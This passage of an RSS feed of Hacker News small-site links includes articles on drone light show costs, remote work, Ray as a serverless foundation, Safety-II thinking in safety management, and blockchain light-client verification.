<figure><img loading="lazy" width="1400" height="399" src="https://verge.aero/wp-content/uploads/2020/05/1_GwmlzLjRyU-BpqmpEpLzhA.jpeg" alt="Verge Aero X1 drones ready for flight" srcset="https://verge.aero/wp-content/uploads/2020/05/1_GwmlzLjRyU-BpqmpEpLzhA.jpeg 1400w, https://verge.aero/wp-content/uploads/2020/05/1_GwmlzLjRyU-BpqmpEpLzhA-300x86.jpeg 300w, https://verge.aero/wp-content/uploads/2020/05/1_GwmlzLjRyU-BpqmpEpLzhA-768x219.jpeg 768w" sizes="(max-width: 1400px) 100vw, 1400px"><figcaption>Verge Aero X1 drones ready for flight</figcaption></figure>



<h2><strong>How much do drone light shows cost?</strong></h2>



<p>Like many new technologies, drone light shows were extremely expensive at first, and they’re still more expensive than desired. But as with computers and flat panel TVs, prices are decreasing over time. Drone light shows will go mainstream as the technology matures. The tools developed by Verge Aero already make it possible to do more for less!</p>



<p>The main driver of cost is the number of drones being flown. It clearly costs a lot more to put on a 500-drone show than a 50-drone show. In addition to the drones themselves, labor, freight, and logistics all add expense.</p>



<p>A small show that’s easy to deploy costs as little as $20,000. But larger and more complicated shows can easily cost many times this number. Here’s a list of factors that impact price:</p>



<ul><li>Drone quantity</li><li>Show design complexity</li><li>Show coordination and rehearsal time</li><li>Airspace authorization and regulatory compliance</li><li>Shipping and logistics</li><li>Crew travel and accommodation</li></ul>



<h2><strong>What is Verge Aero doing differently?</strong></h2>



<p>To make drone shows more affordable, we introduced a few innovations to streamline the process and reduce the amount of work required.</p>



<figure><img loading="lazy" width="1200" height="550" src="https://verge.aero/wp-content/uploads/2020/03/swarm_550.jpg" alt="drone swarm for PNAU All of Us" srcset="https://verge.aero/wp-content/uploads/2020/03/swarm_550.jpg 1200w, https://verge.aero/wp-content/uploads/2020/03/swarm_550-300x138.jpg 300w, https://verge.aero/wp-content/uploads/2020/03/swarm_550-768x352.jpg 768w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Drones swarming for PNAU’s music video All of Us</figcaption></figure>



<h3>Simplified Show Design</h3>



<p>Historically, drone light shows were manually created using a series of applications including animation software like<a href="https://www.blender.org/"> Blender</a>—which was an extremely tedious and limiting process. Even worse, the programmer had to check that vertices in Blender <strong>never </strong>overlapped during animation, because that would mean drones colliding in the air. The output then needed to be transferred to at least one more program to prepare for flight. All this is an extremely unsafe process because it’s prone to human error.&nbsp;</p>



<p>A far better way is to use a unified software application with an easy-to-use interface, like the Verge Aero Design Studio, which automatically handles the anti-collision calculations. Cues are created in the built-in animation software and easily manipulated. Once the design process is complete, the software removes the possibility of human error by deconflicting flight paths, identifying potential issues or mistakes in the show design, and simulating the performance via a rendering pipeline—all without any human intervention.</p>



<p>This software allows designers to generate content with a few key presses, instead of through the laborious processes of using animation tools or writing code. Effects such as complex flocking, as seen in this<a href="https://youtu.be/7DQ4covPEyE"> All of Us music video by PNAU</a>, are automatically created by an effects generator in the Verge Aero Design Studio. Effects created by one designer can easily be …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://verge.aero/everything-about-drone-light-shows/">https://verge.aero/everything-about-drone-light-shows/</a></em></p>]]>
            </description>
            <link>https://verge.aero/everything-about-drone-light-shows/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25022274</guid>
            <pubDate>Sun, 08 Nov 2020 02:34:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Work: How the alternative has become the new norm]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25021471">thread link</a>) | @martin_crd
<br/>
November 7, 2020 | https://remoteworkers.net/blog/remote-work-how-alternative-has-become-new-norm | <a href="https://web.archive.org/web/*/https://remoteworkers.net/blog/remote-work-how-alternative-has-become-new-norm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The debate on the impact telework has on employee productivity &amp; morale is one that has slowly aged with the improvement of technology, but never so important to discuss than in the current global pandemic state the world is faced with.</p><p>For decades the working class has enjoyed, and even thrived in the conventional 9-to-5 office workday with very little contention. In fact, most of the well-known productivity techniques are centered around the premise that employees can only maximize team cohesion &amp; communication when working in a controlled work environment like the office.</p><p>But with the rise of the digital age and need to travel, the world has started to realize the value and need for remote work and set in place internal measures to promote alternative work methods that benefit the workforce.<br>
&nbsp;</p><h2>Reimagining the 9-to-5 workday could improve productivity</h2><p>The contemporary 9-to-5, eight-hour workday was imagined by American labor unions in the 1800s and normalized by Henry Ford in the 1920s. Most employees today simply accept this narrative because it’s what they have gotten so acquainted with. But despite the growing popularity in the demand for remote and flexible work, the need for a change in work culture has been met with much skepticism from managers. A recent study conducted by Remote Workplace Study explores the prime obstacles to implementing a flexible workplace policy:&nbsp;</p><ul><li>Company’s long-standing resistance to change &nbsp;</li><li>Privacy</li><li>Lack of understanding about the benefits of remote work</li><li>Fear of how it will impact the overall company culture</li><li>Technology requirements</li><li>Data security</li></ul><p>Understandably, managers have reservations about changing traditional work culture. Most concerns center around losing control of assessing team cohesiveness and potential reduction in employee productivity &amp; focus. But despite this, change is inevitable. In fact, most studies confirm an increase in productivity, working “smarter” and willingness to work over-time when employees are given the flexibility to choose when and how to work.&nbsp;</p><h2>Millennials are driving the demand for flexible and remote work&nbsp;</h2><p>As of today, millennials (those born between 1981 and 1996) account for almost 50% of the global workforce and are expected to grow to 75% by 2025. This means that the need for companies to adopt flexible and remote work policies is more compelling today than ever before in order to attract and retain a younger, skilled workforce.&nbsp;</p><h2>There are equal benefits to jumping on the remote-work bandwagon for both companies and employees:</h2><p>There are equal benefits to jumping on the remote-work bandwagon for both companies and employees:</p><h3>For Companies</h3><ul><li>Cost savings (office &amp; overhead costs)</li><li>Increase in productivity</li><li>Employee retention &amp; reduced turnover</li><li>Profitability (companies save avg. $11, 000 &nbsp;per part-time telecommuter)</li><li>Environmental benefits (less commuting to work reduces carbon footprint)</li><li>Improved inclusivity and diversity (easier reach and accessibility to skilled talent from different demographics, races, and people with disabilities from all over the world)</li></ul><h3>For Employees</h3><ul><li>Improved work-life balance</li><li>Flexible schedule</li><li>No commute (time and cost savings)</li><li>Location independence (work from home/travel while working)</li><li>More time to spend with family</li><li>Expense savings (transportation, gas, &amp; freedom &nbsp;to live in low-cost cities) &nbsp;</li></ul><h2>The world’s largest firms have endorsed remote working policies in the wake of Covid19</h2><p>It’s no secret that the novel Coronavirus pandemic has played an integral role in the sudden surge of remote work policies implemented across companies worldwide. Big corporations such as Twitter, Facebook, Google, Amazon, &amp; Microsoft have adopted such changes with Twitter and Square CEO Jack Dorsey announcing that his employees can work remotely indefinitely.&nbsp;</p><blockquote><p>“... the work-from-home revolution is shaping the future of the workplace.”</p></blockquote><p>Improved inclusivity and diversity (easier reach and accessibility to skilled talent from different demographics, races, and people with disabilities from all over the world)</p><p>In closing, albeit reservations from conservative and outdated work practices, the future of the work environment is remote and flexible work. In the age of the internet, connecting with skilled professionals has become easier and accessible. Thanks to online professional platforms like remoteworkers.net, companies have access to a wider pool of highly experienced talent and job-seekers can find their ideal remote jobs. Companies would be wise to evolve with the growth in remote work trends in order to become more competitive &amp; improve productivity.</p><h2>Looking for a remote job?</h2><p>Thanks to the internet, connecting skilled professionals with remote-friendly companies has never been easier. Whether you’re an experienced professional looking for your dream remote job or a remote-friendly company looking to hire the best talent, join <a href="https://remoteworkers.net/signup">Remote Workers</a>&nbsp;today!&nbsp;</p></div></div>]]>
            </description>
            <link>https://remoteworkers.net/blog/remote-work-how-alternative-has-become-new-norm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25021471</guid>
            <pubDate>Sun, 08 Nov 2020 00:36:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ideal Foundation for a General Purpose Serverless Platform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25021393">thread link</a>) | @thedataexchange
<br/>
November 7, 2020 | https://www.anyscale.com/blog/the-ideal-foundation-for-a-general-purpose-serverless-platform | <a href="https://web.archive.org/web/*/https://www.anyscale.com/blog/the-ideal-foundation-for-a-general-purpose-serverless-platform">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h4>Why Ray is poised to play a central role in future serverless offerings</h4><p>The history of computing infrastructure is one of steady improvements over extended periods. Cloud computing brought several capabilities that we now take for granted including the elimination of upfront investments in hardware, the ability to pay for compute resources on an as-needed basis, and elasticity. The move to the cloud has <a href="https://www.networkworld.com/article/3512885/enterprises-now-spend-more-on-cloud-infrastructure-services-than-on-premises-data-center-gear.html"><u>accelerated in recent years</u></a> and many companies now use a mix of on-premise infrastructure alongside <a href="https://gradientflow.com/one-simple-chart-most-companies-use-multiple-cloud-providers/"><u>multiple cloud providers</u></a>.</p><p>In 2015, AWS introduced Lambda, a service that offered <i>cloud functions</i> and introduced the concept of <i>serverless computing</i>. Serverless and cloud functions differ from traditional cloud computing in two critical ways: (1) serverless abstracts away infrastructure (scaling, provisioning servers) freeing developers to focus on writing programs, (2) serverless provides finer-grained increments for billing (sub-second, compared to traditional cloud computing which uses minutes).</p><p>Since the introduction of AWS Lambda, interest in serverless and cloud functions <a href="https://trends.google.com/trends/explore/TIMESERIES/1597100400?hl=en-US&amp;tz=420&amp;date=2015-01-01+2020-08-10&amp;geo=US&amp;q=serverless&amp;sni=3"><u>has grown</u></a> and all major cloud providers now have similar offerings. <a href="https://www2.eecs.berkeley.edu/Pubs/TechRpts/2019/EECS-2019-3.pdf"><u>Experts predict</u></a> that serverless will continue to grow in importance and more applications will use serverless computing platforms in the years ahead. But we are still in the early stages of serverless computing. A widely read&nbsp; 2019 paper (<a href="https://www2.eecs.berkeley.edu/Pubs/TechRpts/2019/EECS-2019-3.pdf"><u>“A Berkeley View on Serverless Computing”</u></a>) described&nbsp; “challenges and research opportunities that need to be addressed for serverless computing to fulfill its promise”.</p><p>In this post we examine some limitations of current cloud functions (also referred to as <i>FaaS</i> or <i>serverless</i>). We note that the distributed computing framework <a href="https://github.com/ray-project/ray"><u>Ray</u></a> addresses many of these challenges and argue that Ray is the right foundation for a <a href="https://www.youtube.com/watch?v=vzMXTpdJSuk"><u>general purpose serverless framework</u></a>.</p><h2>Serverless: Special Purpose vs General Purpose</h2><p>There have been multiple efforts to expand the scope of serverless. Projects like <a href="http://ex.camera/nsdi17/"><u>ExCamera</u></a>, <a href="http://pywren.io/"><u>PyWren</u></a>, <a href="https://www.serverless.com/blog/using-tensorflow-serverless-framework-deep-learning-image-recognition"><u>TF-on-serverless</u></a>, and <a href="https://www.qubole.com/blog/spark-on-aws-lambda/"><u>Spark-on-Lambda</u></a> try to run more complex workloads on FaaS platforms like Lambda. Several industry platforms provide serverless-like capabilities and user experiences, including <a href="https://aws.amazon.com/rds/aurora/serverless/"><u>Amazon Aurora</u></a>, <a href="https://databricks.com/blog/2017/06/07/databricks-serverless-next-generation-resource-management-for-apache-spark.html"><u>Databricks</u></a>, <a href="https://cloud.google.com/serverless/whitepaper"><u>BigQuery</u></a>, and others. However, these offerings generally target <i>specific workloads</i> and do not aim to run arbitrary applications. We define the characteristics of such a framework (Ray) in the following table, along with key tradeoffs:</p><div><div><p><img src="https://images.ctfassets.net/xjan103pcp94/5bhF7EF9VdFyQtqqqgvz45/c446dcf421ea3c288a6dd087ddba469b/blog_grid.png" alt="blog table"></p></div></div><h2>Why Ray for General Purpose Serverless?</h2><p><b>Ray hides servers</b></p><p>Like existing FaaS platforms, Ray abstracts away servers from the applications. With version 1.0, users do not need to specify the cluster size or the type of instances when launching an application. Instead, they only need to provide Ray with the set of available resources (e.g., a list of instance types in AWS or a list of nodes and their capabilities in an on-prem cluster) and Ray will automatically pick the instance types and dynamically scale up and down to match the application demands.</p><p><b>Ray supports stateful applications</b></p><p>Serverless platforms scale and provision storage and compute separately, thus computations on serverless platforms are stateless. Cloud functions do not store previous transactions or knowledge. The typical flow is to run a computation (a function call), write results to a storage service, and if needed, another function can take that output and use it.&nbsp;&nbsp;</p><p>The <a href="https://en.wikipedia.org/wiki/Actor_model#Fundamental_concepts"><u>Actor model</u></a> is a powerful programming paradigm that focuses on the semantics of message passing, and works seamlessly when local or remote. Ray supports <a href="https://en.wikipedia.org/wiki/Actor_model"><u>actors</u></a>, which are stateful workers (or services). Having a serverless platform that can support stateful computations dramatically increases the number of possible applications. Stateful operators allow Ray to efficiently support streaming computations, <a href="https://anyscale.com/blog/heres-what-you-need-to-look-for-in-a-model-server-to-build-ml-powered-services"><u>machine learning model serving</u></a>, and web applications. In fact there are already companies who use Ray in applications that combine both streaming and machine learning. For example, Ant Group “built a multi-paradigm fusion engine on top of Ray that combines streaming, graph processing, and machine learning in a single system to perform real-time fraud detection and online promotion.”</p><p><b>Ray supports direct communication between tasks</b></p><p>Almost every distributed application, such as streaming or data processing, exchanges data between tasks. Unfortunately, existing serverless platforms do not allow direct communication between functions. The only way two functions can communicate with each other is via a cloud storage system like S3. Unfortunately, this is slow and expensive.&nbsp;</p><p>In contrast, Ray enables arbitrary tasks and actors to communicate with each other. This enables applications to efficiently exchange data and implement arbitrary communication patterns.</p><p><b>Ray lets developers access hardware accelerators</b></p><p>Developers know what type of hardware resources best serve their applications so giving them the ability to control resources is an important feature of any compute platform. FaaS services currently let developers specify execution time limits and memory sizes. But in some applications - notably machine learning model training - developers need to access specific accelerators (GPUs, TPUs, etc.). At this time FaaS providers do not offer this level of control over resources.&nbsp;</p><p>A serverless platform built on top of Ray would have no limitations in terms of specifying resources. Developers who use Ray can already describe the hardware resources they need (number of CPUs, GPUs, TPUs, and other hardware accelerators). Future versions of Ray will even allow developers to specify the precise type of chip they prefer (e.g., “two V100 GPUs”).</p><p><b>Ray provides an open source API</b></p><p>There is no “standard API” for writing serverless applications. We believe that Ray is a strong candidate for such an open, serverless API. Ray allows developers to write general programs, not just functions. It combines support for both stateless and stateful applications and access to widely used programming languages (Python and Java, with more to follow). In fact, Ray is usually described as a distributed computing platform that can be used to scale applications with minimal effort.</p><p><br><b>Ray supports fine-grained coordination and control, which can lead to better performance</b></p><p>There are many applications where control over data locality and scheduling are critical. This includes the broad range of applications that need to distribute and share data across compute nodes. Current serverless offerings are a poor fit for this class of applications. For example, a developer who uses serverless to perform a gradient computation in machine learning will not have control over where data and cloud functions are located. Another example comes from reinforcement learning, where developers will want to use the same compute node for training policies and performing rollouts.</p><p>Ray overcomes these limitations by providing data locality and scheduling control. A developer who uses Ray can specify which actors should run on the same machine.</p><p><br><b>Ray has no runtime limits</b></p><p>Current offerings (<a href="https://aws.amazon.com/about-aws/whats-new/2018/10/aws-lambda-supports-functions-that-can-run-up-to-15-minutes/"><u>Lambda</u></a>, <a href="https://cloud.google.com/functions/docs/concepts/exec#:~:text=Function%20execution%20time%20is%20limited,period%20up%20to%209%20minutes."><u>Cloud Functions</u></a>, <a href="https://build5nines.com/azure-functions-extend-execution-timeout-past-5-minutes/#:~:text=One%20of%20the%20biggest%20benefits,originally%20set%20to%205%20minutes."><u>Azure Functions</u></a>) have execution times that are capped at around 15 minutes or less. This limits the types of applications that a FaaS platform can support. In contrast, since Ray runs on top of existing clouds or clusters, there are no time limits.</p><h2>But what about costs?</h2><p>One of the most popular aspects of serverless is that users are billed based on usage. Serverless platforms use accounting units that are measured in milliseconds, compared to traditional cloud computing which uses minutes.</p><p>Since cloud providers charge at the level of an instance, as a software layer, (open source) Ray by itself cannot instantiate and release compute resources quickly enough to deliver fine-grained accounting units. For example, if you have an actor running on a server with 32 cores (and you only have one actor running on it), your cloud provider will likely charge you for 32 cores. Ray does not address this discrepancy between utilization and cost. Getting to fine-grained accounting units would require that you build <a href="https://www.anyscale.com/product"><u>a serverless platform on top of Ray</u></a>.</p><p>With that said, Ray can automatically allocate new instances and shutdown existing instances in minutes. Thus, Ray can already provide serverless functionality for coarse grained jobs that run for say 30 minutes. Examples that might fall under the realm of coarse grained jobs include&nbsp; streaming, model training, and model serving jobs.&nbsp;</p><p>Finally, Ray also has the potential to provide substantial cost savings for coarse-grain workloads. The cost of using cloud functions can be 4x-5x higher than a cloud computing instance operating at 100% utilization. Indeed, at the time of writing, a 3GB RAM AWS Lambda <a href="https://aws.amazon.com/lambda/pricing/"><u>costs $0.0000048958 per 100ms</u></a> or $0.1762488/hour. In comparison, a t3.medium instance with 4GB RAM <a href="https://aws.amazon.com/ec2/pricing/on-demand/"><u>costs just $0.0416/hour</u></a> which is 4.2x cheaper, and when considering per GB RAM pricing, it is 5.65x cheaper. This is an underestimate because it does not include the per-request costs.</p><h2><b>Summary</b></h2><p>As far back as 2016, <a href="https://youtu.be/wYCLbLrEoqs?t=95"><u>experts were already noting</u></a> how serverless tools enable teams to quickly build extremely functional and scalable applications. Since then a growing number of developers are turning to serverless technologies to build applications. But for serverless to live up to its promise, current offerings (cloud functions) need to address the limitations listed in this post.</p><p>Companies are still in the early stages of exploring serverless technologies. We believe that Ray is the ideal foundation for a general purpose serverless framework. With the rise of AI and other data intensive applications, Ray is poised to play a central role in future serverless offerings.</p></div></div></div>]]>
            </description>
            <link>https://www.anyscale.com/blog/the-ideal-foundation-for-a-general-purpose-serverless-platform</link>
            <guid isPermaLink="false">hacker-news-small-sites-25021393</guid>
            <pubDate>Sun, 08 Nov 2020 00:28:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why do things go right? – Safety Differently]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25021366">thread link</a>) | @absolute100
<br/>
November 7, 2020 | https://safetydifferently.com/why-do-things-go-right/ | <a href="https://web.archive.org/web/*/https://safetydifferently.com/why-do-things-go-right/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<div id="attachment_3805"><p><img aria-describedby="caption-attachment-3805" src="http://www.safetydifferently.com/wp-content/uploads/2018/09/josue-isai-ramos-figueroa-741921-unsplash-1-300x218.jpg" alt="" width="300" height="218"></p><p id="caption-attachment-3805">Photo by Josue Isai Ramos Figueroa on Unsplash</p></div>
<p>In his 2014 <em>Safety I and Safety II: The past and future of safety management</em>, Erik Hollnagel makes the argument that we should not (just) try to stop things from going wrong. Instead, we need to understand why most things go right, and then ensure that as much as possible indeed goes right. It seems so obvious. Yet it is light years away from how most organizations ‘do’ safety today, with their focus on low numbers of lagging indicators, incidents and injuries.</p>
<p>That said, many organizations have now begun to recognize the severe organizational deficiencies, cultural problems and ethical headaches that lag indicators create for them. Most will be familiar with the following sorts of things:</p>
<ul>
<li>Numbers games and the hiding or renaming of injuries and incidents;</li>
<li>Counterproductive and credibility-straining sloganeering (‘Zero Harm!’);</li>
<li>Short-termism (driven by quarterly figures);</li>
<li>Creative case management and a lack of compassion for those who do get hurt in the course of work (think of the cynical use of ‘suitable duties’ to keep someone off the injury stats or lost time books);</li>
<li>The misdirection of accountability through sanctioning, dismissal or exclusion of those who have been hurt in the past (just cancel the contractor’s access card, for instance);</li>
<li>The statistical insignificance of any change in typical lagging indicators (‘We went from 3 lost time injuries last year to 1 this year! And we worked a total of 5 million person-hours!’ …<em>Uhmm, right</em>);</li>
<li>Organizational learning disabilities and cultures of risk secrecy;</li>
<li>Worker cynicism, mistrust and disenchantment;</li>
<li>Cases of outright management fraud that have got managers dismissed or even in jail.</li>
</ul>
<p>Erik’s insight is the hinge on which the transition to Safety Differently turns. Let’s not stare ourselves silly at the lowest possible injury and incident numbers, with the ridiculous and counterproductive Siren Song of ‘Zero Harm’ (See Sheratt &amp; Dainty, 2017, for how ‘Zero’ is linked to more fatalities and serious injuries)as the ultimate paradise we want to reach. Deming said it long before anybody in the Resilience community said it: get rid of targets, slogans and exhortations. They get in the way of allowing your people to produce quality work (Deming, 1982). So instead, let’s learn why things go right and find out what we can do to make it even more so. Safety is not about the <em>absence&nbsp;</em>of negatives; it is about the <em>presence&nbsp;</em>of capacities. The field of Resilience Engineering, formally founded at a meeting in Söderköping in Sweden over a decade ago (Dekker, 2006)was of course driven by this logic. I witnessed Erik and others forcefully making this very point, from many different angles, for a week in a room full of peers and stakeholders.</p>
<p>One way to illustrate this point, as Erik indeed does (and others now do as well) is by way of a Gaussian, or normal curve. The curve shows that the number of the things that go wrong (the left side of the curve) is tiny. On the right side of the curve are the heroic, unexpected surprises (a Hudson River landing, for instance) that fall far outside what people would normally experience or have to deal with. In between, the huge bulbous middle of the figure, sits the quotidian or daily creation of success. This is where good outcomes are made, despite the organizational, operational and financial obstacles, despite the rules, the bureaucracy, the common frustrations and obstacles. This is where work can be hard, but is still successful. The way to make even further progress on safety, suggests this figure, is not by trying to make the red part of things that go wrong even smaller, but by understanding what accounts for the big middle part where things go right. And then enhancing the capacities that make it so. That way, we don’t make the red part smaller by making the red part smaller. We make the red part smaller by making the white part bigger. Research by René Amalberti tells us that it is indeed likely that this is <em>the&nbsp;</em>way to make progress on safety in already safe systems (Amalberti, 2001, 2006, 2013). In those systems, we have milked the recipes for how to prevent things from going wrong to the maximum already. We have many layers of protection in place. We have rules to the point of overregulation. We monitor, record, investigate and standardize the designs people work with. Ever more things targeted at the red part are not going to make it any smaller. The complexity of the system won’t let us. And in fact, the more we do to make that part smaller with what we already know (more rules, more limits on people, more technology and barriers) may in fact contribute to novel pathways to breakdown, accidents and failures (Dekker, 2011).</p>
<div id="attachment_3799"><p><img aria-describedby="caption-attachment-3799" src="http://www.safetydifferently.com/wp-content/uploads/2018/09/Picture1.png" alt="" width="939" height="633" srcset="https://safetydifferently.com/wp-content/uploads/2018/09/Picture1.png 939w, https://safetydifferently.com/wp-content/uploads/2018/09/Picture1-768x518.png 768w" sizes="(max-width: 939px) 100vw, 939px"></p><p id="caption-attachment-3799">The way to make the red part (unwanted outcomes) on the left smaller is not by making it impossible for things to go wrong (as we’ve done almost everything in that regard already). We make the red part smaller by making the white part bigger: focusing on why things go right and enhancing the capacities that make it so. Figure by Kelvin Genn.</p></div>
<p><em>Shifting the paradigm</em></p>
<p>The question that most organizations yearn to have answered, though, is this: what is going to take the place of their long-held and easily communicated total recordable injury frequency rate? As Thomas Kuhn (1970)pointed out, people are unwilling to relinquish a paradigm—despite all its faults—if there is no plausible, viable alternative to take its place.</p>
<p>A few years back, I was working, together with some students, with a large health authority which employed some 25,000 people. The patient safety statistics were dire, if typical: one in thirteen of the patients who walked (or were carried) through the doors to receive care were hurt in the process of receiving that care. 1 in 13, or 7%. These numbers weren’t unique, of course. They were also problematic. Because what exactly is ‘nosocomial harm,’ harm that originates in a hospital? What is ‘medical error’ and when is it putatively responsible for the adverse event that happened to the patient? Indeed, when exactly does the patient become that ‘one’ out of thirteen? These are important (and huge) epistemological and ontological questions. I have vociferously commented on them before (and I didn’t exactly make friends in the field, for example by claiming how safe gun owners are in comparison to doctors) (Dekker, 2007).</p>
<p>But it’s not the point here. When we asked the health authority what they typically found in the one case that went wrong—the one that turned into an ‘adverse event,’ the one that inflicted harm on the patient—here is what they came up with. After all, they had plenty of data to go on: one out of thirteen in a large healthcare system can add up to a sizable number of patients per day. So in the patterns that all this data yielded, they consistently found:</p>
<ul>
<li>Workarounds</li>
<li>Shortcuts</li>
<li>Violations</li>
<li>Guidelines not followed</li>
<li>Errors and miscalculations</li>
<li>Unfindable people or medical instruments</li>
<li>Unreliable measurements</li>
<li>User-unfriendly technologies</li>
<li>Organizational frustrations</li>
<li>Supervisory shortcomings</li>
</ul>
<p>It seemed a pretty intuitive and straightforward list. It was also a list that firmly belonged to a particular era in our evolving understanding of safety: that of the person as the weakest link, of the ‘human factor’ as a set of mental and moral deficiencies that only great systems and stringent supervision can meaningfully guard against. In that sort of logic, we’ve got great systems and solid procedures—it’s just those people who are unreliable or non-compliant:</p>
<ul>
<li>People are the problem to control</li>
<li>We need to find out what people did wrong</li>
<li>We write or enforce more rules</li>
<li>We tell everyone to try harder</li>
<li>We get rid of bad apples</li>
</ul>
<p>Many organizational strategies, to the extent that you can call them that, were indeed organized around these very premises. Poster campaigns that reminded people of particular risks they needed to be aware of, for instance. Or strict surveillance and compliance monitoring with respect to certain ‘zero-tolerance’ or ‘red-rule’ activities (e.g. hand hygiene, drug administration protocols). Or a ‘just culture’ process that got those lower on the medical competence hierarchy more frequently ‘just-cultured’ (code for suspended, demoted, dismissed, fired) than those with more power in the system. Or some miserably measly attention to supervisor leadership training.</p>
<p>We were of course interested to know the extent to which these investments in reducing the ‘one in thirteen’ had paid off. They hadn’t. The health authority was still stuck at one in thirteen.</p>
<p><em>What would Erik do?</em></p>
<p>This is when we asked the Erik Hollnagel question. We asked: “What about the other twelve? Do you even know why they go right? Have you ever asked yourself that question?” The answer we got was “no.” All the resources that the health authority had were directed toward investigating and understanding the ones that went wrong. There was organizational, reputational and political pressure to do so, for sure. And the resources to investigate the instances of harm were too meager to begin with. So this is all they could do. We then offered to do it for them. And so, in an acutely unscientific but highly opportunistic way, we spent time in the hospitals of the authority to find out what happened when things went well, when there was no evidence of adverse events or patient harm.</p>
<p>When we got back together after a period of weeks, we compared notes. At first we couldn’t believe it, thinking that what we had found was just a fluke, an irregular and rare irritant in data that should otherwise have been telling us something quite different. But it turned out that everybody had found that in the twelve cases that go right, that don’t result in an adverse event or patient harm, there were:</p>
<ul>
<li>Workarounds</li>
<li>Shortcuts</li>
<li>Violations</li>
<li>Guidelines not followed</li>
<li>Errors and miscalculations</li>
<li>Unfindable people or medical instruments</li>
<li>Unreliable measurements</li>
<li>User-unfriendly technologies</li>
<li>Organizational frustrations</li>
<li>Supervisory …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://safetydifferently.com/why-do-things-go-right/">https://safetydifferently.com/why-do-things-go-right/</a></em></p>]]>
            </description>
            <link>https://safetydifferently.com/why-do-things-go-right/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25021366</guid>
            <pubDate>Sun, 08 Nov 2020 00:25:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A prerecorded message from Richard Stallman]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25020937">thread link</a>) | @billyjobob
<br/>
November 7, 2020 | https://peertube.qtg.fr/videos/watch/d4aab174-50ca-4455-bb32-ed463982e943 | <a href="https://web.archive.org/web/*/https://peertube.qtg.fr/videos/watch/d4aab174-50ca-4455-bb32-ed463982e943">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://peertube.qtg.fr/videos/watch/d4aab174-50ca-4455-bb32-ed463982e943</link>
            <guid isPermaLink="false">hacker-news-small-sites-25020937</guid>
            <pubDate>Sat, 07 Nov 2020 23:37:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaling Blockchains (Part 1) – The Interactive Bloom Proof]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25020616">thread link</a>) | @irwt
<br/>
November 7, 2020 | https://lums.blog/scaling-blockchains-part1-ibp | <a href="https://web.archive.org/web/*/https://lums.blog/scaling-blockchains-part1-ibp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h2 id="introduction">Introduction</h2>

<p>When talking about the “scalability” of blockchains, it’s always good to define first what exactly we mean by it. In this article, I will not focus on things like “how many transactions can be processed by a chain per unit of time”. Instead, I am more interested to explore how we can scale the number of nodes in the system, while still keeping it decentralized and trustless. This problem might sound as an easy one to solve, but as you will see, it’s actually quite a tricky problem.</p>

<p>The structure of this article will be like this:</p>
<ul>
  <li>First, I will describe some fundamental concepts that one has to know before understanding the problem and the solution proposed by this article. I will describe what <strong>full nodes</strong> are, what <strong>Simplified Payment Verification (SPV)</strong> is, how it works, and how <strong>Merkle trees</strong> are used in blockchains.</li>
  <li>In the second part of the article, I’ll explain the two different implementations of SPV. I will also explain the shortcomings of both variants. Note: Eventhough other chains, such as Ethereum, use Patricia trees, instead of Merkle trees, and use an account-based model, instead of an UTXO model, the same issues hold true for Ethereum as well.</li>
  <li>In the last part of the article, I’ll  introduce a possible solution to the scalability shortcomings of SPV. Here I will introduce the idea of an Interactive Bloom Proof (IBP), an interesting concept I came up with while researching at <a href="https://lums.blog/bloomlab.io">Bloom Lab</a>. It allows for decentralized, truly trustless SPV-like interactions (something that, as we will see, is not possible today), while at the same time allowing the network to scale easily. One can actually build a whole new blockchain architecture around the IBP concept, but that’s a topic for another time. As implementing the Interactive Bloom Proof into existing chains requires hard forking them, I do not expect this idea to get much traction. But I think it is a very useful concept to people working on new blockchain designs.</li>
</ul>

<h2 id="full-nodes-and-simplified-payment-verification">Full Nodes and Simplified Payment Verification</h2>
<p>A device that connects to a blockchain network is referred to in the blockchain space as a “node”. Nodes can be classified as either “full nodes”, or “lightweight nodes”. Full nodes store every block and transaction of a blockchain and constantly check the validity of incoming messages. Full nodes independently create a chain by following some consensus rules. In the case of Bitcoin and (as of this writing) Ethereum, <strong>Proof of Work (PoW)</strong> is the consensus algorithm used for creating the chain, aka decentralized ledger. Consensus algorithms are quite a large topic and deserve a whole article for themselves. As for this article, if you are not already familiar with PoW, just keep in mind that it’s the algorithm that guarantees that every full node will end up with the same locally stored chain. In other words, thanks to PoW and the chain’s validity rules, full nodes will converge to the same blockchain state, without having to trust anybody. That said, not many users use full nodes to access the blockchain however. Due to the large storage capacity blockchains require (in the case of Bitcoin, as of this writing one needs approximately 302 Gb, and Ethereum’s “archive nodes” more than 4 Tb) most users opt-in with lighweight nodes, or some centralized service.</p>

<p>Lightweight nodes rely on something known as <strong>simplified payment verification</strong> (SPV). SPV was initially proposed in the original Bitcoin whitepaper and is quite straightforward as a concept:
